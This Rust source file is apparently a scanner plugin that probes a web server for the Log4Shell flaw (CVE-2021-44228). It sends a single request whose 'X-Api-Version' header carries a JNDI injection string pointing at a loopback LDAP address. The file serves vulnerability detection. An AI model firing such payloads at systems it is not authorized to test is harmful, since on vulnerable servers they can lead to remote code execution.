/* http-vuln-cve2021-44228-4 - Log4Shell JNDI injection probe. */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
let port = unsafe { (*ctx).port };
let mut resp = String::new();
resp = match http_request(ctx, "GET", "/", None, "X-Api-Version: ${jndi:ldap://127.0.0.1/a}\r\n", "", None, 8192) {
    Some(r) if !r.is_empty() => r,
    _ => { set_out(ctx, "http-vuln-cve2021-44228-4: no HTTP response"); return 0; }
};
set_out(ctx, &format!("probe sent: / [{}] (CVE-2021-44228; verify out-of-band)", http_status(&resp)));
0
}
